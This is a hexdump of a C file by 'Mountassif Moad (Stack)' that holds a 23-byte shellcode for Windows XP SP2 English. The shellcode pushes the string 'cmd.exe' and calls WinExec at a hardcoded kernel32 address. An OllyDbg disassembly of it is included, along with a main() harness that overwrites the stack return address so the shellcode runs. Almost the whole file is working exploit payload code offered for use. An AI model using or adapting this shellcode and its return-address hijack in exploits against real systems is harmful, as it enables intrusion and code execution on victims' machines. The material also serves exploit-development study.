00000000  2f 2a 0d 0a 77 69 6e 33  32 2f 78 70 20 73 70 32  |/*..win32/xp sp2|
00000010  20 28 45 6e 29 20 63 6d  64 2e 65 78 65 20 32 33  | (En) cmd.exe 23|
00000020  20 62 79 74 65 73 0d 0a  41 75 74 68 6f 72 20 3a  | bytes..Author :|
00000030  20 4d 6f 75 6e 74 61 73  73 69 66 20 4d 6f 61 64  | Mountassif Moad|
00000040  0d 0a 41 2e 4b 2e 41 20  3a 20 53 74 61 63 6b 0d  |..A.K.A : Stack.|
00000050  0a 44 65 73 63 72 69 70  74 69 6f 6e 20 3a 20 49  |.Description : I|
00000060  74 27 73 20 61 20 32 33  20 42 79 74 65 20 53 68  |t's a 23 Byte Sh|
00000070  65 6c 6c 63 6f 64 65 20  77 68 69 63 68 20 45 78  |ellcode which Ex|
00000080  65 63 75 74 65 20 43 6d  64 2e 65 78 65 20 54 65  |ecute Cmd.exe Te|
00000090  73 74 65 64 20 55 6e 64  65 72 20 57 69 6e 64 6f  |sted Under Windo|
000000a0  77 73 20 58 70 20 53 50  32 20 45 6e 0d 0a 0d 0a  |ws Xp SP2 En....|
000000b0  67 65 74 20 74 68 65 20  66 6f 6c 6c 6f 77 69 6e  |get the followin|
000000c0  67 20 69 66 20 77 65 20  64 69 73 61 73 73 65 6d  |g if we disassem|
000000d0  6c 65 20 74 68 69 73 20  63 6f 64 65 20 63 6f 6d  |le this code com|
000000e0  70 69 6c 65 64 20 77 69  74 68 20 6f 6c 6c 79 20  |piled with olly |
000000f0  64 65 62 75 67 67 65 72  0d 0a 20 0d 0a 30 30 34  |debugger.. ..004|
00000100  30 32 30 30 30 20 20 3e  20 38 42 45 43 20 20 20  |02000  > 8BEC   |
00000110  20 20 20 20 20 20 20 20  20 20 4d 4f 56 20 45 42  |          MOV EB|
00000120  50 2c 45 53 50 0d 0a 30  30 34 30 32 30 30 32 20  |P,ESP..00402002 |
00000130  20 2e 20 36 38 20 36 35  37 38 36 35 32 30 20 20  | . 68 65786520  |
00000140  20 20 20 20 50 55 53 48  20 32 30 36 35 37 38 36  |    PUSH 2065786|
00000150  35 0d 0a 30 30 34 30 32  30 30 37 20 20 2e 20 36  |5..00402007  . 6|
00000160  38 20 36 33 36 44 36 34  32 45 20 20 20 20 20 20  |8 636D642E      |
00000170  50 55 53 48 20 32 45 36  34 36 44 36 33 0d 0a 30  |PUSH 2E646D63..0|
00000180  30 34 30 32 30 30 43 20  20 2e 20 38 44 34 35 20  |040200C  . 8D45 |
00000190  46 38 20 20 20 20 20 20  20 20 20 20 4c 45 41 20  |F8          LEA |
000001a0  45 41 58 2c 44 57 4f 52  44 20 50 54 52 20 53 53  |EAX,DWORD PTR SS|
000001b0  3a 5b 45 42 50 2d 38 5d  0d 0a 30 30 34 30 32 30  |:[EBP-8]..004020|
000001c0  30 46 20 20 2e 20 35 30  20 20 20 20 20 20 20 20  |0F  . 50        |
000001d0  20 20 20 20 20 20 20 50  55 53 48 20 45 41 58 0d  |       PUSH EAX.|
000001e0  0a 30 30 34 30 32 30 31  30 20 20 2e 20 42 38 20  |.00402010  . B8 |
000001f0  38 44 31 35 38 36 37 43  20 20 20 20 20 20 4d 4f  |8D15867C      MO|
00000200  56 20 45 41 58 2c 6b 65  72 6e 65 6c 33 32 2e 57  |V EAX,kernel32.W|
00000210  69 6e 45 78 65 63 0d 0a  30 30 34 30 32 30 31 35  |inExec..00402015|
00000220  20 20 2e 20 46 46 44 30  20 20 20 20 20 20 20 20  |  . FFD0        |
00000230  20 20 20 20 20 43 41 4c  4c 20 45 41 58 0d 0a 2a  |     CALL EAX..*|
00000240  2f 0d 0a 23 69 6e 63 6c  75 64 65 20 3c 73 74 64  |/..#include <std|
00000250  69 6f 2e 68 3e 0d 0a 75  6e 73 69 67 6e 65 64 20  |io.h>..unsigned |
00000260  63 68 61 72 20 73 68 65  6c 6c 63 6f 64 65 5b 5d  |char shellcode[]|
00000270  20 3d 0d 0a 20 20 20 20  20 20 20 20 20 20 20 20  | =..            |
00000280  20 20 20 20 20 20 20 20  20 20 20 20 22 5c 78 38  |            "\x8|
00000290  62 5c 78 65 63 5c 78 36  38 5c 78 36 35 5c 78 37  |b\xec\x68\x65\x7|
000002a0  38 5c 78 36 35 22 0d 0a  20 20 20 20 20 20 20 20  |8\x65"..        |
000002b0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002c0  22 5c 78 32 30 5c 78 36  38 5c 78 36 33 5c 78 36  |"\x20\x68\x63\x6|
000002d0  64 5c 78 36 34 5c 78 32  65 22 0d 0a 20 20 20 20  |d\x64\x2e"..    |
000002e0  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
000002f0  20 20 20 20 22 5c 78 38  64 5c 78 34 35 5c 78 66  |    "\x8d\x45\xf|
00000300  38 5c 78 35 30 5c 78 62  38 5c 78 38 44 22 0d 0a  |8\x50\xb8\x8D"..|
00000310  20 20 20 20 20 20 20 20  20 20 20 20 20 20 20 20  |                |
00000320  20 20 20 20 20 20 20 20  22 5c 78 31 35 5c 78 38  |        "\x15\x8|
00000330  36 5c 78 37 43 5c 78 66  66 5c 78 64 30 22 3b 0d  |6\x7C\xff\xd0";.|
00000340  0a 69 6e 74 20 6d 61 69  6e 20 28 29 0d 0a 7b 0d  |.int main ()..{.|
00000350  0a 69 6e 74 20 2a 72 65  74 3b 0d 0a 72 65 74 3d  |.int *ret;..ret=|
00000360  28 69 6e 74 20 2a 29 26  72 65 74 2b 32 3b 0d 0a  |(int *)&ret+2;..|
00000370  70 72 69 6e 74 66 28 22  53 68 65 6c 6c 63 6f 64  |printf("Shellcod|
00000380  65 20 4c 65 6e 67 74 68  20 69 73 20 3a 20 25 64  |e Length is : %d|
00000390  5c 6e 22 2c 73 74 72 6c  65 6e 28 73 68 65 6c 6c  |\n",strlen(shell|
000003a0  63 6f 64 65 29 29 3b 0d  0a 28 2a 72 65 74 29 3d  |code));..(*ret)=|
000003b0  28 69 6e 74 29 73 68 65  6c 6c 63 6f 64 65 3b 0d  |(int)shellcode;.|
000003c0  0a 72 65 74 75 72 6e 20  30 3b 0d 0a 7d           |.return 0;..}|
000003cd
